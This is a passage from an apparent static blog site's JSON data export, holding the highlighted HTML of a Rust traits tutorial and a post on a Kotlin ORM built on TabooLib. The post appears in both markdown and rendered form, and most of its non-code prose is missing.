keyword\">self</span><span class=\"token punctuation\">.</span>title<span class=\"token punctuation\">,</span> <span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>author<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">pub</span> <span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">Weibo</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">pub</span> username<span class=\"token punctuation\">:</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">pub</span> content<span class=\"token punctuation\">:</span> <span class=\"token class-name\">String</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">impl</span> <span class=\"token class-name\">Summary</span> <span class=\"token keyword\">for</span> <span class=\"token class-name\">Weibo</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">summarize</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token class-name\">String</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token macro property\">format!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;&#125;&#123;&#125;\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>username<span class=\"token punctuation\">,</span> <span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>content<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>RustKotlin</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><blockquote>\n<p> <code>Summary</code>  <code>pub</code>  <code>Summary</code> </p>\n<p><strong> <code>A</code>  <code>T</code> <code>A</code>  <code>T</code> </strong> <code>Post</code>  <code>Display</code>  <code>Post</code>  <code>String</code>  <code>Summary</code>  <code>Summary</code> </p>\n<p> <code>String</code>  <code>Display</code> </p>\n<p><strong></strong></p>\n</blockquote>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">pub</span> <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">notify</span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span><span class=\"token keyword\">impl</span> <span class=\"token class-name\">Summary</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Breaking news! &#123;&#125;\"</span><span class=\"token punctuation\">,</span> item<span class=\"token punctuation\">.</span><span class=\"token function\">summarize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// </span>\n<span class=\"token keyword\">pub</span> <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">notify</span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">impl</span> <span class=\"token class-name\">Summary</span> <span class=\"token operator\">+</span> <span class=\"token class-name\">Display</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">//...</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// where</span>\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">some_function</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">:</span> <span class=\"token class-name\">Display</span> <span class=\"token operator\">+</span> <span class=\"token class-name\">Clone</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">U</span><span class=\"token punctuation\">:</span> <span class=\"token class-name\">Clone</span> <span class=\"token operator\">+</span> <span class=\"token class-name\">Debug</span><span class=\"token operator\">></span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">,</span> u<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span><span class=\"token class-name\">U</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token keyword\">i32</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">//...</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// where</span>\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">some_function</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">U</span><span class=\"token operator\">></span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">,</span> u<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span><span class=\"token class-name\">U</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token keyword\">i32</span>\n    <span class=\"token keyword\">where</span> <span class=\"token class-name\">T</span><span class=\"token punctuation\">:</span> <span class=\"token class-name\">Display</span> <span class=\"token operator\">+</span> <span class=\"token class-name\">Clone</span><span class=\"token punctuation\">,</span>\n          <span class=\"token class-name\">U</span><span class=\"token punctuation\">:</span> <span class=\"token class-name\">Clone</span> <span class=\"token operator\">+</span> <span class=\"token class-name\">Debug</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">//...</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p> <code>impl Trait</code> </p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">pub</span> <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">notify</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">:</span> <span class=\"token class-name\">Summary</span><span class=\"token operator\">></span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Breaking news! &#123;&#125;\"</span><span class=\"token punctuation\">,</span> item<span class=\"token punctuation\">.</span><span class=\"token function\">summarize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n</blockquote>\n<p>&#x2F;&#x2F; TODO</p>\n"},{"title":"Kotlin ORM","date":"2022-01-11T16:00:00.000Z","author":"","hide":false,"summary":"TabooLibKotlin ORM","_content":"\n# Kotlin ORM\n\nTabooLibktormsql-dslORM\n\nktorm\n\n## \n\n\n\n****\n\n13\n\nAndroid Jetpack RoomTabooLibDSL\n\nRoom \n\n```kotlin\ndata class ExampleEntity(\n    // PrimaryKey option\n    @PrimaryKey(autoGenerate = true)\n    @Column(name = \"id\", type = ColumnTypeSQL.INT)\n    val id: Int? = null,\n    @Column(name = \"type\", type = ColumnTypeSQL.TEXT, options = [ColumnOptionSQL.NOTNULL])\n    val type: String,\n    @Column(name = \"user\", type = ColumnTypeSQL.TEXT, options = [ColumnOptionSQL.NOTNULL])\n    val user: String,\n    @Column(name = \"user\", type = ColumnTypeSQL.TEXT, def = \"null\")\n    val data: String?\n)\n\ninterface ExampleDAO : IDao<ExampleEntity> {\n    @Query(\"SELECT * FROM {table}\")\n    fun queryAll(): List<ExampleEntity>\n\n    @Insert\n    fun insert(entity: ExampleEntity)\n    \n    @Query(\"DELETE FROM {table}\")\n    fun delete()\n    \n    @Query(\"SELECT WHERE id > {id} FROM {table}\")\n    fun querySome(id: Int): List<ExampleEntity>\n    \n    // TabooLib DSL\n    @DSL\n    fun selectUser(name: String): ExampleEntity? {\n        return table.workspace(datasource) {\n            select { where { \"user\" eq name } }\n        }.firstOrNull {\n            adaptResultSet()\n        }\n    }\n}\n\nobject AppDatabase {\n    /**\n     * ORMBuilder#buildFromConf(ConfigurationSection, String)\n     */\n    private val builder by lazy {\n        ORMBuilder.newBuilder()\n            .host(\"localhost\")\n            .port(3306)\n            .user(\"root\")\n            .password(\"root\")\n            .database(\"database\")\n            .buildHost()\n    } \n    \n    \n    val exampleTableDao by lazy {\n        //  DAO\n        builder.build(\"exampleTable\" ,ExampleDAO::class.java)\n    }\n}\n```\n\n## \n\n### \n\nTabooLib\n\nTabooLib\n\n### \n\nRoom\n\nRetrofitRetrofit\n\n\n\n\n\n### \n\n- KotlinJDK8default\n- ResultSet\n- /genericSuperClass/Interfaces\n- voidUnitreturnTypeVoid::class.java,Unit::class.javareturnType.name == \"void\"","source":"_posts/taboolib-orm.md","raw":"---\ntitle: Kotlin ORM\ndate: 2022-01-12\nauthor: \nhide: false\nsummary: TabooLibKotlin ORM\ncategories: \ntags:\n  - Kotlin\t\n  - TabooLib\n  - MySQL\n  - \n---\n\n# Kotlin ORM\n\nTabooLibktormsql-dslORM\n\nktorm\n\n## \n\n\n\n****\n\n13\n\nAndroid Jetpack RoomTabooLibDSL\n\nRoom \n\n```kotlin\ndata class ExampleEntity(\n    // PrimaryKey option\n    @PrimaryKey(autoGenerate = true)\n    @Column(name = \"id\", type = ColumnTypeSQL.INT)\n    val id: Int? = null,\n    @Column(name = \"type\", type = ColumnTypeSQL.TEXT, options = [ColumnOptionSQL.NOTNULL])\n    val type: String,\n    @Column(name = \"user\", type = ColumnTypeSQL.TEXT, options = [ColumnOptionSQL.NOTNULL])\n    val user: String,\n    @Column(name = \"user\", type = ColumnTypeSQL.TEXT, def = \"null\")\n    val data: String?\n)\n\ninterface ExampleDAO : IDao<ExampleEntity> {\n    @Query(\"SELECT * FROM {table}\")\n    fun queryAll(): List<ExampleEntity>\n\n    @Insert\n    fun insert(entity: ExampleEntity)\n    \n    @Query(\"DELETE FROM {table}\")\n    fun delete()\n    \n    @Query(\"SELECT WHERE id > {id} FROM {table}\")\n    fun querySome(id: Int): List<ExampleEntity>\n    \n    // TabooLib DSL\n    @DSL\n    fun selectUser(name: String): ExampleEntity? {\n        return table.workspace(datasource) {\n            select { where { \"user\" eq name } }\n        }.firstOrNull {\n            adaptResultSet()\n        }\n    }\n}\n\nobject AppDatabase {\n    /**\n     * ORMBuilder#buildFromConf(ConfigurationSection, String)\n     */\n    private val builder by lazy {\n        ORMBuilder.newBuilder()\n            .host(\"localhost\")\n            .port(3306)\n            .user(\"root\")\n            .password(\"root\")\n            .database(\"database\")\n            .buildHost()\n    } \n    \n    \n    val exampleTableDao by lazy {\n        //  DAO\n        builder.build(\"exampleTable\" ,ExampleDAO::class.java)\n    }\n}\n```\n\n## \n\n### \n\nTabooLib\n\nTabooLib\n\n### \n\nRoom\n\nRetrofitRetrofit\n\n\n\n\n\n### \n\n- KotlinJDK8default\n- ResultSet\n- /genericSuperClass/Interfaces\n- voidUnitreturnTypeVoid::class.java,Unit::class.javareturnType.name == \"void\"","slug":"taboolib-orm","published":1,"updated":"2022-11-24T02:42:00.010Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jtv002hsfkl3gfsb68t","content":"<h1 id=\"Kotlin-ORM\"><a href=\"#Kotlin-ORM\" class=\"headerlink\" title=\"Kotlin ORM\"></a>Kotlin ORM</h1><p>TabooLibktormsql-dslORM</p>\n<p>ktorm</p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p></p>\n<p><strong></strong></p>\n<p>13</p>\n<p>Android Jetpack RoomTabooLibDSL</p>\n<p>Room </p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">data</span> <span class=\"token keyword\">class</span> <span class=\"token function\">ExampleEntity</span><span class=\"token punctuation\">(</span>\n    <span class=\"token comment\">// PrimaryKey option</span>\n    <span class=\"token annotation builtin\">@PrimaryKey</span><span class=\"token punctuation\">(</span>autoGenerate <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span>\n    <span class=\"token annotation builtin\">@Column</span><span class=\"token punctuation\">(</span>name <span class=\"token operator\">=</span> <span class=\"token string\">\"id\"</span><span class=\"token punctuation\">,</span> type <span class=\"token operator\">=</span> ColumnTypeSQL<span class=\"token punctuation\">.</span>INT<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> id<span class=\"token operator\">:</span> Int<span class=\"token operator\">?</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span>\n    <span class=\"token annotation builtin\">@Column</span><span class=\"token punctuation\">(</span>name <span class=\"token operator\">=</span> <span class=\"token string\">\"type\"</span><span class=\"token punctuation\">,</span> type <span class=\"token operator\">=</span> ColumnTypeSQL<span class=\"token punctuation\">.</span>TEXT<span class=\"token punctuation\">,</span> options <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>ColumnOptionSQL<span class=\"token punctuation\">.</span>NOTNULL<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> type<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n    <span class=\"token annotation builtin\">@Column</span><span class=\"token punctuation\">(</span>name <span class=\"token operator\">=</span> <span class=\"token string\">\"user\"</span><span class=\"token punctuation\">,</span> type <span class=\"token operator\">=</span> ColumnTypeSQL<span class=\"token punctuation\">.</span>TEXT<span class=\"token punctuation\">,</span> options <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>ColumnOptionSQL<span class=\"token punctuation\">.</span>NOTNULL<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> user<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n    <span class=\"token annotation builtin\">@Column</span><span class=\"token punctuation\">(</span>name <span class=\"token operator\">=</span> <span class=\"token string\">\"user\"</span><span class=\"token punctuation\">,</span> type <span class=\"token operator\">=</span> ColumnTypeSQL<span class=\"token punctuation\">.</span>TEXT<span class=\"token punctuation\">,</span> def <span class=\"token operator\">=</span> <span class=\"token string\">\"null\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> <span class=\"token keyword\">data</span><span class=\"token operator\">:</span> String<span class=\"token operator\">?</span>\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">interface</span> ExampleDAO <span class=\"token operator\">:</span> IDao<span class=\"token operator\">&lt;</span>ExampleEntity<span class=\"token operator\">&gt;</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token annotation builtin\">@Query</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"SELECT * FROM {table}\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">queryAll</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> List<span class=\"token operator\">&lt;</span>ExampleEntity<span class=\"token operator\">&gt;</span>\n\n    <span class=\"token annotation builtin\">@Insert</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">insert</span><span class=\"token punctuation\">(</span>entity<span class=\"token operator\">:</span> ExampleEntity<span class=\"token punctuation\">)</span>\n    \n    <span class=\"token annotation builtin\">@Query</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"DELETE FROM {table}\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    \n    <span class=\"token annotation builtin\">@Query</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"SELECT WHERE id &gt; {id} FROM {table}\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">querySome</span><span class=\"token punctuation\">(</span>id<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> List<span class=\"token operator\">&lt;</span>ExampleEntity<span class=\"token operator\">&gt;</span>\n    \n    <span class=\"token comment\">// TabooLib DSL</span>\n    <span class=\"token annotation builtin\">@DSL</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">selectUser</span><span class=\"token punctuation\">(</span>name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> ExampleEntity<span class=\"token operator\">?</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> table<span class=\"token punctuation\">.</span><span class=\"token function\">workspace</span><span class=\"token punctuation\">(</span>datasource<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            select <span class=\"token punctuation\">{</span> <span class=\"token keyword\">where</span> <span class=\"token punctuation\">{</span> <span class=\"token string\">\"user\"</span> eq name <span class=\"token punctuation\">}</span> <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">.</span><span class=\"token function\">firstOrNull</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token function\">adaptResultSet</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">object</span> AppDatabase <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">/**\n     * ORMBuilder#buildFromConf(ConfigurationSection, String)\n     */</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">val</span> builder <span class=\"token keyword\">by</span> lazy <span class=\"token punctuation\">{</span>\n        ORMBuilder<span class=\"token punctuation\">.</span><span class=\"token function\">newBuilder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">host</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"localhost\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">port</span><span class=\"token punctuation\">(</span><span class=\"token number\">3306</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">user</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"root\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">password</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"root\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">database</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"database\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">buildHost</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span> \n    \n    \n    <span class=\"token keyword\">val</span> exampleTableDao <span class=\"token keyword\">by</span> lazy <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">//  DAO</span>\n        builder<span class=\"token punctuation\">.</span><span class=\"token function\">build</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"exampleTable\"</span> <span class=\"token punctuation\">,</span>ExampleDAO<span class=\"token operator\">::</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span>java<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>TabooLib</p>\n<p>TabooLib</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>Room</p>\n<p>RetrofitRetrofit</p>\n<p></p>\n<p></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><ul>\n<li>KotlinJDK8default</li>\n<li>ResultSet</li>\n<li>/genericSuperClass/Interfaces</li>\n<li>voidUnitreturnTypeVoid::class.java,Unit::class.javareturnType.name == void</li>\n</ul>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":""},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go","url":"https://blog.stellaris.wang/","title":""}]}},"excerpt":"","more":"<h1 id=\"Kotlin-ORM\"><a href=\"#Kotlin-ORM\" class=\"headerlink\" title=\"Kotlin ORM\"></a>Kotlin ORM</h1><p>TabooLibktormsql-dslORM</p>\n<p>ktorm</p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p></p>\n<p><strong></strong></p>\n<p>13</p>\n<p>Android Jetpack RoomTabooLibDSL</p>\n<p>Room </p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">data</span> <span class=\"token keyword\">class</span> <span class=\"token function\">ExampleEntity</span><span class=\"token punctuation\">(</span>\n    <span class=\"token comment\">// PrimaryKey option</span>\n    <span class=\"token annotation builtin\">@PrimaryKey</span><span class=\"token punctuation\">(</span>autoGenerate <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span>\n    <span class=\"token annotation builtin\">@Column</span><span class=\"token punctuation\">(</span>name <span class=\"token operator\">=</span> <span class=\"token string\">\"id\"</span><span class=\"token punctuation\">,</span> type <span class=\"token operator\">=</span> ColumnTypeSQL<span class=\"token punctuation\">.</span>INT<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> id<span class=\"token operator\">:</span> Int<span class=\"token operator\">?</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span>\n    <span class=\"token annotation builtin\">@Column</span><span class=\"token punctuation\">(</span>name <span class=\"token operator\">=</span> <span class=\"token string\">\"type\"</span><span class=\"token punctuation\">,</span> type <span class=\"token operator\">=</span> ColumnTypeSQL<span class=\"token punctuation\">.</span>TEXT<span class=\"token punctuation\">,</span> options <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>ColumnOptionSQL<span class=\"token punctuation\">.</span>NOTNULL<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> type<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n    <span class=\"token annotation builtin\">@Column</span><span class=\"token punctuation\">(</span>name <span class=\"token operator\">=</span> <span class=\"token string\">\"user\"</span><span class=\"token punctuation\">,</span> type <span class=\"token operator\">=</span> ColumnTypeSQL<span class=\"token punctuation\">.</span>TEXT<span class=\"token punctuation\">,</span> options <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>ColumnOptionSQL<span class=\"token punctuation\">.</span>NOTNULL<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> user<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n    <span class=\"token annotation builtin\">@Column</span><span class=\"token punctuation\">(</span>name <span class=\"token operator\">=</span> <span class=\"token string\">\"user\"</span><span class=\"token punctuation\">,</span> type <span class=\"token operator\">=</span> ColumnTypeSQL<span class=\"token punctuation\">.</span>TEXT<span class=\"token punctuation\">,</span> def <span class=\"token operator\">=</span> <span class=\"token string\">\"null\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> <span class=\"token keyword\">data</span><span class=\"token operator\">:</span> String<span class=\"token operator\">?</span>\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">interface</span> ExampleDAO <span class=\"token operator\">:</span> IDao<span class=\"token operator\">&lt;</span>ExampleEntity<span class=\"token operator\">></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token annotation builtin\">@Query</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"SELECT * FROM &#123;table&#125;\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">queryAll</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> List<span class=\"token operator\">&lt;</span>ExampleEntity<span class=\"token operator\">></span>\n\n    <span class=\"token annotation builtin\">@Insert</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">insert</span><span class=\"token punctuation\">(</span>entity<span class=\"token operator\">:</span> ExampleEntity<span class=\"token punctuation\">)</span>\n    \n    <span class=\"token annotation builtin\">@Query</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"DELETE FROM &#123;table&#125;\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    \n    <span class=\"token annotation builtin\">@Query</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"SELECT WHERE id > &#123;id&#125; FROM &#123;table&#125;\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">querySome</span><span class=\"token punctuation\">(</span>id<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> List<span class=\"token operator\">&lt;</span>ExampleEntity<span class=\"token operator\">></span>\n    \n    <span class=\"token comment\">// TabooLib DSL</span>\n    <span class=\"token annotation builtin\">@DSL</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">selectUser</span><span class=\"token punctuation\">(</span>name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> ExampleEntity<span class=\"token operator\">?</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> table<span class=\"token punctuation\">.</span><span class=\"token function\">workspace</span><span class=\"token punctuation\">(</span>datasource<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            select <span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">where</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token string\">\"user\"</span> eq name <span class=\"token punctuation\">&#125;</span> <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">.</span><span class=\"token function\">firstOrNull</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token function\">adaptResultSet</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">object</span> AppDatabase <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">/**\n     * ORMBuilder#buildFromConf(ConfigurationSection, String)\n     */</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">val</span> builder <span class=\"token keyword\">by</span> lazy <span class=\"token punctuation\">&#123;</span>\n        ORMBuilder<span class=\"token punctuation\">.</span><span class=\"token function\">newBuilder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">host</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"localhost\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">port</span><span class=\"token punctuation\">(</span><span class=\"token number\">3306</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">user</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"root\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">password</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"root\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">database</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"database\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">buildHost</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span> \n    \n    \n    <span class=\"token keyword\">val</span> exampleTableDao <span class=\"token keyword\">by</span> lazy <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">//  DAO</span>\n        builder<span class=\"token punctuation\">.</span><span class=\"token function\">build</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"exampleTable\"</span> <span class=\"token punctuation\">,</span>ExampleDAO<span class=\"token operator\">::</span><span class=\"token keyword\">class</span><span class=\"token 